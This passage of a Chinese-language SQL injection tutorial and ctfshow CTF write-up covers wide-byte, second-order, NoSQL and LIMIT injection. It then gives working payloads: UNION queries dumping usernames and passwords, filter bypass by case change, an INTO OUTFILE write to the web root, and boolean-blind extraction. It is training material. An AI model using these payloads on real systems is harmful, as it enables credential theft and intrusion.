class=\"language-none\">1、用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）\n2、数据库对自己存储的数据非常放心，直接取出恶意数据给用户<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><p>首先我们需要了解一下单字节和宽字节</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。\n宽字节字符集： 所有的字符都使用两个字节来表示。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><font color='red'>注：英文字母占一个字节，汉字占两字节</font><br>为什么会产生宽字节注入漏洞，这是因为前端使用的是<code>utf-8编码</code>，后端使用的是<code>gbk，gb2312或其他宽字节编码</code>，这样两者就会存在出入，进而导致了宽字节注入的产生。<br>对编码字符集的小科普</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">尽管现在呼吁所有的程序都使用unicode编码，所有的网站都使用utf-8编码，来一个统一的国际规范。\n但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用着自己国家的一套编码，\n比如我国的gbk、gb2312，作为自己默认的编码类型。也有一些cms为了考虑老用户，推出了gbk和utf-8\n两个版本（例如:dedecms） 我们就以gbk字符编码为例，拉开帷幕。\nGBK全称《汉字内码扩展规范》,gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以\ngbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。我们可以通过输出来验证这句话。\n例如：0xD50×5C 对应了汉字“誠 ”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c \n经URL解码后为“誠”。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>前端使用的部分函数对特殊字符进行转义，添加<code>反斜杠 \\</code>，那我们如果能够再前面多一个字符，使其与\\组成汉字，就成功的使后面的特殊字符逃逸出来，从而可以进行注入。<br>下方是转义时运用的部分函数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">magic_quotes_gpc：当PHP的传参中有特殊字符就会在前面加转义字符'\\'<span class=\"token punctuation\">,</span>来做一定的过滤 \naddslashes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数返回在预定义字符之前添加反斜杠的字符串\nmysql_real_escape_string<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 函数转义 <span class=\"token keyword\">SQL</span> 语句中使用的字符串中的特殊字符\nmysql_escape_string<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> — 转义一个字符串<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"相关知识介绍\"><a href=\"#相关知识介绍\" class=\"headerlink\" title=\"相关知识介绍\"></a>相关知识介绍</h1><h2 id=\"万能语句\"><a href=\"#万能语句\" class=\"headerlink\" title=\"万能语句\"></a>万能语句</h2><p><code>1&#39; or 1=1#</code>经常可以在sql注入中见到，它可以显示所有的信息，这是为什么呢，下面我们来一探究竟</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$<span class=\"token keyword\">sql</span><span class=\"token operator\">=</span><span class=\"token string\">\"select * from users where username='$username' and password='$pass'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>我们把sql语句与payload相结合，那这个sql语句就是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$<span class=\"token keyword\">sql</span><span class=\"token operator\">=</span><span class=\"token string\">\"select * from users where username='1' or 1=1 #' and password='1'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>那它在后端执行的实际语句就是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token comment\"># ' and  password='1'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>因为#是注释符，后面的内容都会被注释掉，所以它执行的语句等同于</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里’1’ or 1=1肯定是true(username=‘1’可能是假，但1=1肯定为true，or语句只要有一个为true就为true)，因此返回结果为true，所以执行的语句就是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>因此就挑选出了所有的数据</p>\n<h2 id=\"md5特殊字符串\"><a href=\"#md5特殊字符串\" class=\"headerlink\" title=\"md5特殊字符串\"></a>md5特殊字符串</h2><p>首先介绍一下md5函数</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">md5(string,raw)\n\n参数 \t描述\nstring \t必需。规定要计算的字符串。\nraw \t可选。规定十六进制或二进制输出格式：\n        TRUE - 原始 16 字符二进制格式\n    \tFALSE - 默认。32 字符十六进制数<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里当是true的时候，转成原始16字符二进制格式，此时出现的都将是乱码，我们是无法进行注入的但这里有个特殊的字符串<code>ffifdyop</code>，组成查询语句的时候这个hex会被转成字符串，如果转换之后的字符串包含’or’，就会和原查询语句一起组成。此时语句就称为了<code>&#39;or&#39;6+其他字符</code>，此时就成功执行了万能语句，进而获取了数据</p>\n<h2 id=\"nosql注入\"><a href=\"#nosql注入\" class=\"headerlink\" title=\"nosql注入\"></a>nosql注入</h2><p>nosql是非关系性的数据库，而mysql是关系性的数据库<br>有关nosql相关的文章我(小白)认为这个是讲的最明白的一个<a href=\"https://blog.szfszf.top/tech/nosql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93mongodb/\">NoSQL注入总结(MongoDB) </a><br>也可以参考这篇文章<a href=\"https://www.anquanke.com/post/id/97211\">https://www.anquanke.com/post/id/97211</a></p>\n<p>nosql常用命令符如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">db<span class=\"token punctuation\">.</span>collection<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>query<span class=\"token punctuation\">,</span> projection<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">//query 可选，使用查询操作符指定查询条件</span>\n<span class=\"token comment\">//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）</span>\n举例：\n<span class=\"token comment\">//查找username为JrXnm的信息</span>\ndb<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123;<span class=\"token string\">'username'</span>:<span class=\"token string\">'JrXnm'</span>&#125;<span class=\"token punctuation\">)</span> \n\nmongodb条件操作符\n比较： \n    $gt : <span class=\"token operator\">></span>\n    $lt : <span class=\"token operator\">&lt;</span>\n    $gte: <span class=\"token operator\">>=</span>\n    $lte: <span class=\"token operator\">&lt;=</span>\n    $ne : <span class=\"token operator\">!=</span>、<span class=\"token operator\">&lt;></span>\n    <span class=\"token comment\">//查找用户名不为admin且password为123456的用户</span>\n    db<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123;<span class=\"token string\">'username'</span>: &#123;$ne:<span class=\"token string\">'admin'</span>&#125;<span class=\"token punctuation\">,</span> <span class=\"token string\">'password'</span>: <span class=\"token string\">'123456'</span>&#125;<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">/**\n    * : 范围查询 &#123; \"age\" : &#123; \"$gte\" : 2 , \"$lte\" : 21&#125;&#125;\n    * : $ne &#123; \"age\" : &#123; \"$ne\" : 23&#125;&#125;\n    * : $lt &#123; \"age\" : &#123; \"$lt\" : 23&#125;&#125;\n    */</span>\n\n条件：\n    $<span class=\"token operator\">in</span> : <span class=\"token operator\">in</span>\n    $nin: <span class=\"token operator\">not</span> <span class=\"token operator\">in</span>\n    $<span class=\"token keyword\">all</span>: <span class=\"token keyword\">all</span> \n    $<span class=\"token operator\">or</span>:<span class=\"token operator\">or</span>\n    $<span class=\"token operator\">and</span>: <span class=\"token operator\">and</span>\n    $<span class=\"token operator\">not</span>: 反匹配<span class=\"token punctuation\">(</span><span class=\"token number\">1.3</span><span class=\"token number\">.3</span>及以上版本<span class=\"token punctuation\">)</span>\n    $exist: \n    <span class=\"token comment\">//如果记录中有包含该属性的全部返回</span>\n    db<span class=\"token punctuation\">.</span>collection<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123;title:&#123;$<span class=\"token keyword\">exists</span>:<span class=\"token boolean\">true</span>&#125;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token comment\">//查找用户名为在这个数组中的用户信息</span>\n    db<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123;<span class=\"token string\">'username'</span>: &#123;$<span class=\"token operator\">in</span>: <span class=\"token punctuation\">[</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'JrXnm'</span><span class=\"token punctuation\">]</span>&#125;&#125;<span class=\"token punctuation\">)</span>\n\n正则：  \n    模糊查询用正则式：db<span class=\"token punctuation\">.</span>customer<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123;<span class=\"token string\">'name'</span>: &#123;<span class=\"token string\">'$regex'</span>:<span class=\"token string\">'.*s.*'</span>&#125; &#125;<span class=\"token punctuation\">)</span>\n    正则的另一种写法：db<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>&#123;<span class=\"token string\">'username'</span>:<span class=\"token operator\">/</span>jrx<span class=\"token operator\">/</span>i&#125;<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"limit注入\"><a href=\"#limit注入\" class=\"headerlink\" title=\"limit注入\"></a>limit注入</h2><p>学习过<a href=\"https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html\">p神limit注入文章</a>后，有了如下的认识<br>limit看似是无法进行注入的，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO有写入shell的权限，因此limit也是存在注入的，本地测试如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">></span><span class=\"token number\">0</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> id <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">procedure</span> analyse<span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">></span><span class=\"token number\">0</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> id <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token keyword\">procedure</span> analyse<span class=\"token punctuation\">(</span>extractvalue<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x3a</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539432.png\" alt=\"在这里插入图片描述\"><br>经过测试之后，我发涉及到select的无法使用，怀着疑问重新查看文章后发现评论区有师傅问出了同样的问题，得知新版的已不再支持select语句<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539104.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"可以相互替代的函数总结\"><a href=\"#可以相互替代的函数总结\" class=\"headerlink\" title=\"可以相互替代的函数总结\"></a>可以相互替代的函数总结</h2><h3 id=\"时间盲注中的时间\"><a href=\"#时间盲注中的时间\" class=\"headerlink\" title=\"时间盲注中的时间\"></a>时间盲注中的时间</h3><p>表示时间的三种函数(第三种为笛卡尔积)</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nbenchmark<span class=\"token punctuation\">(</span><span class=\"token number\">5000000</span><span class=\"token punctuation\">,</span>sha<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> A<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> B<span class=\"token punctuation\">,</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539149.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"布尔盲注中的正则\"><a href=\"#布尔盲注中的正则\" class=\"headerlink\" title=\"布尔盲注中的正则\"></a>布尔盲注中的正则</h3><p>表示匹配的两种方式</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">regexp</span>\n<span class=\"token operator\">rlike</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539362.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"联合查询中的where\"><a href=\"#联合查询中的where\" class=\"headerlink\" title=\"联合查询中的where\"></a>联合查询中的where</h3><p>当where被过滤的时候，我们可以用right join和on来代替where，这里简单介绍一下此函数</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">RIGHT</span> <span class=\"token keyword\">JOIN</span> 关键字会右表 <span class=\"token punctuation\">(</span>table_name2<span class=\"token punctuation\">)</span> 那里返回所有的行，即使在左表 <span class=\"token punctuation\">(</span>table_name1<span class=\"token punctuation\">)</span> 中\n没有匹配的行。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>这里本地测试几个语句，希望能对大家理解有所帮助</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">right</span> <span class=\"token keyword\">join</span> emails <span class=\"token keyword\">on</span> substr<span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">regexp</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539696.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> emails <span class=\"token keyword\">right</span> <span class=\"token keyword\">join</span> users <span class=\"token keyword\">on</span> substr<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">regexp</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539684.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"注入实战\"><a href=\"#注入实战\" class=\"headerlink\" title=\"注入实战\"></a>注入实战</h1><h2 id=\"联合查询\"><a href=\"#联合查询\" class=\"headerlink\" title=\"联合查询\"></a>联合查询</h2><h3 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select username,password from ctfshow_user2 where \nusername !='flag' and id = '\"</span><span class=\"token punctuation\">.</span>$_GET<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"' limit 1;\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>先输入个1试试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539050.png\" alt=\"在这里插入图片描述\">发现回显只有两个，此时说明下面的联合查询不能用123，应该用1,2<br>给出了拼接语句，可以看出是单引号闭合，我们此时尝试构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539136.png\" alt=\"在这里插入图片描述\"><br>语句中说了，列名是ctfshow_user2，我们构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">' union select 1,group_concat(password) from ctfshow_user2--+\n// -1'</span> union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">group_concat</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span> from  ctfshow_user2<span class=\"token operator\">--</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539324.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#96;&#96;&#96;sql\n&#x2F;&#x2F;对传入的参数进行了过滤\n  function waf($str)&#123;\n   &#x2F;&#x2F;代码过于简单，不宜展示\n  &#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>查询字段数</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">1</span>' order by <span class=\"token number\">3</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539450.png\" alt=\"在这里插入图片描述\"><br>这说明有字列数为3，此时尝试union select构造语句</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union seleCt <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> ctfshow_user <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539578.png\" alt=\"在这里插入图片描述\"><br>报错，我一开始想的是字母和数字可能被过滤了，但我想到order by查询时没有报错，这说明应该是过滤了某个固定字符，尝试大小写绕过</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>' uNion sElect <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> ctfshow_user <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539636.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h3><p>返回逻辑</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>!preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/[\\x00-\\x7f]/i'</span><span class=\"token punctuation\">,</span> json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'查询成功'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>知识科普</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">\\xnn 匹配ASCII代码中十六进制代码为nn的字符\n0x00&#x3D;&#x3D;0\n0x7f&#x3D;&#x3D;127<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>针对本关的话，我们可以采用写入文件来进行绕过从而获取flag，我们知道文件网页上回显出的文件一般位于<code>/var/www/html</code>下，因此我们可构造payload如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">0</span>' union select username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">from</span> ctfshow_user5 into outfile \n<span class=\"token string\">'/var/www/html/quan.txt'</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时我们再去访问quan.txt<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539710.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"布尔盲注-1\"><a href=\"#布尔盲注-1\" class=\"headerlink\" title=\"布尔盲注\"></a>布尔盲注</h2><h3 id=\"0X01-1\"><a href=\"#0X01-1\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">//密码检测</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>is_numeric<span class=\"token punctuation\">(</span>$password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>&#123;\n    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span>\n    die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  &#125;\n\n  <span class=\"token comment\">//密码判断</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">row</span><span class=\"token punctuation\">[</span><span class=\"token string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">=</span>$password<span class=\"token punctuation\">)</span>&#123;\n      $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'登陆成功'</span><span class=\"token punctuation\">;</span>\n    &#125;\n\n  <span class=\"token comment\">//TODO:感觉少了个啥，奇怪</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/file|into|ascii/i'</span><span class=\"token punctuation\">,</span> $username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>&#123;\n        $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string\">'用户名非法'</span><span class=\"token punctuation\">;</span>\n        die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    &#125;\n      <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>本关过滤了ascii，但ord函数在处理单字符时与ascii效果相同，因此我们这里替换一下即可<br>利用的基本原理是布尔盲注，在界面中测试的话payload就是</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username: <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),1,1)='</span>c'<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span>\npassword: <span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>此时回显密码错误，那就说明用户语句执行正确，说明注入成功，此时响应为<code>&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;,&quot;count&quot;:0,&quot;data&quot;:[]&#125;</code>，可以根据<code>\\u5bc6\\u7801\\u9519\\u8bef</code>来进行判断username是否执行正确也就得到了首字母，但由于这样测试太慢，我们可以利用python脚本来进行</p>\n<pre 